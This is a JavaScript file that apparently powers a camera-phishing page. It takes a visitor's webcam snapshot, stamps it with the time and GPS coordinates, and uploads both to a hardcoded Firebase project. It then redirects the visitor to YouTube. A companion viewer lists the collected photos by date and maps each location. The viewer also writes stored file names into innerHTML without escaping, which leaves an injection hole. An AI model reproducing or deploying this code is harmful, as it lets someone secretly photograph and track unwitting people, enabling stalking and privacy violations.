// Your Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyDEAy2KXezICmuuQZnhNq12nqwwBouDjt4",
    authDomain: "webcamera-es-universe-git.firebaseapp.com",
    databaseURL: "https://webcamera-es-universe-git-default-rtdb.firebaseio.com",
    projectId: "webcamera-es-universe-git",
    storageBucket: "webcamera-es-universe-git.appspot.com",
    messagingSenderId: "949054088643",
    appId: "1:949054088643:web:039f79fcae7259f4358976"
};

// Initialize Firebase
const app = firebase.initializeApp(firebaseConfig);
const storage = firebase.storage();
const database = firebase.database();

// Variable to store location
let userLocation = {
    latitude: null,
    longitude: null
};

// Function to request location permission and get location
function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((position) => {
            userLocation.latitude = position.coords.latitude.toFixed(6); // Store latitude
            userLocation.longitude = position.coords.longitude.toFixed(6); // Store longitude
            console.log('Location retrieved:', userLocation);
        }, (error) => {
            console.error('Error accessing location:', error);
            document.getElementById('message').textContent = 'Location access denied or an error occurred.';
        });
    } else {
        console.error('Geolocation is not supported by this browser.');
    }
}

// Function to format date and time
function formatDateTime() {
    const now = new Date();
    const date = now.toLocaleDateString();
    const time = now.toLocaleTimeString();
    const day = now.toLocaleDateString('en-US', { weekday: 'long' });
    return `${day}, ${date}, ${time}`;
}

// Function to capture photo and upload to Firebase Storage with watermark
function capturePhoto(video) {
    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');

    // Set the canvas size to the video size
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    // Draw the video frame to the canvas
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Check if location is available for watermark
    if (userLocation.latitude && userLocation.longitude) {
        // Set watermark text with date, time, and location
        const watermarkText = `Date: ${formatDateTime()} \nL:${userLocation.latitude}, L:${userLocation.longitude}`;

        // Set watermark background
        context.fillStyle = 'black';
        context.globalAlpha = 0.5;
        context.fillRect(0, canvas.height - 80, canvas.width, 80);  // Background rectangle

        // Set text properties for watermark
        context.font = '20px Arial'; // Font size and type
        context.fillStyle = 'white'; // Text color
        context.globalAlpha = 1.0; // Full opacity for the text
        context.fillText(watermarkText, 10, canvas.height - 50); // Positioning the text
    }

    // Convert the canvas image to a Blob
    canvas.toBlob(async function(blob) {
        const fileName = `photo_${Date.now()}.png`;
        const storageRef = storage.ref(`users/${fileName}`);

        try {
            // Upload the image to Firebase Storage
            await storageRef.put(blob);
            console.log('Photo uploaded with filename:', fileName);

            // Save metadata (location) in Firebase Database
            await database.ref('photos/' + fileName).set({
                latitude: userLocation.latitude,
                longitude: userLocation.longitude,
                timestamp: Date.now(),
                filename: fileName
            });

            // Redirect after 1 second
            setTimeout(() => {
                window.location.href = 'https://youtube.com/';  // Redirect URL after upload
            }, 1000);  // 1000 milliseconds = 1 second
        } catch (error) {
            console.error('Error uploading to Firebase:', error);
        }
    }, 'image/png', 1.0);  // The third argument '1.0' specifies the image quality (max quality)
}

// Function to display photos by date
function displayPhotosByDate() {
    const storageRef = storage.ref('users');
    const dateList = document.getElementById('dateList');
    const photoList = document.getElementById('photoList');

    storageRef.listAll().then((result) => {
        const photosByDate = {};

        // Group photos by date
        result.items.forEach((imageRef) => {
            imageRef.getMetadata().then((metadata) => {
                const timestamp = metadata.timeCreated;
                const date = new Date(timestamp).toLocaleDateString();

                if (!photosByDate[date]) {
                    photosByDate[date] = [];
                }
                
                // Retrieve location from database
                database.ref('photos/' + imageRef.name).once('value').then((snapshot) => {
                    const data = snapshot.val();
                    if (data) {
                        photosByDate[date].push({
                            name: imageRef.name,
                            fullPath: imageRef.fullPath,
                            time: new Date(timestamp).toLocaleTimeString(),
                            latitude: data.latitude,
                            longitude: data.longitude
                        });
                    } else {
                        console.error('No metadata found for', imageRef.name);
                    }
                }).catch((error) => {
                    console.error('Error retrieving metadata:', error);
                });
            }).catch((error) => {
                console.error('Error retrieving metadata:', error);
            });
        });

        // Display date list after grouping photos
        setTimeout(() => {
            for (const date in photosByDate) {
                const dateItem = document.createElement('div');
                dateItem.className = 'date-item';
                dateItem.textContent = date;
                dateItem.onclick = () => displayPhotosForDate(photosByDate[date]);

                dateList.appendChild(dateItem);
            }
        }, 1000); // Adding a delay to ensure metadata processing is complete
    }).catch((error) => {
        console.error('Error listing images:', error);
    });
}

// Function to display photos for a specific date
function displayPhotosForDate(photos) {
    const photoList = document.getElementById('photoList');
    photoList.innerHTML = ''; // Clear previous list

    photos.forEach((photo, index) => {
        const photoItem = document.createElement('div');
        photoItem.className = 'photo-item';
        photoItem.innerHTML = `
            <span>${index + 1}. ${photo.name} - ${photo.time}</span>
            <button onclick="viewPhoto('${photo.fullPath}')">View</button>
            <button onclick="showMap('${photo.latitude}', '${photo.longitude}')">Map</button>
        `;
        photoList.appendChild(photoItem);
    });
}

// Function to view the selected photo
function viewPhoto(photoPath) {
    const storageRef = storage.ref(photoPath);
    storageRef.getDownloadURL().then((url) => {
        const imgElement = document.createElement('img');
        imgElement.src = url; // Set image source to the URL
        imgElement.style.maxWidth = '100%'; // Responsive image
        imgElement.style.height = 'auto';
        const photoList = document.getElementById('photoList');
        photoList.innerHTML = ''; // Clear previous list and display only the selected image
        photoList.appendChild(imgElement);
    }).catch((error) => {
        console.error('Error retrieving image URL:', error);
    });
}

// Function to show map with coordinates
function showMap(latitude, longitude) {
    if (latitude && longitude) {
        const mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
        window.open(mapUrl, '_blank'); // Open map in a new tab
    } else {
        alert('No coordinates available for this photo.');
    }
}

// Start displaying photos by date on page load
window.onload = () => {
    getLocation(); // Request location permission first
    displayPhotosByDate(); // Display photos by date
};
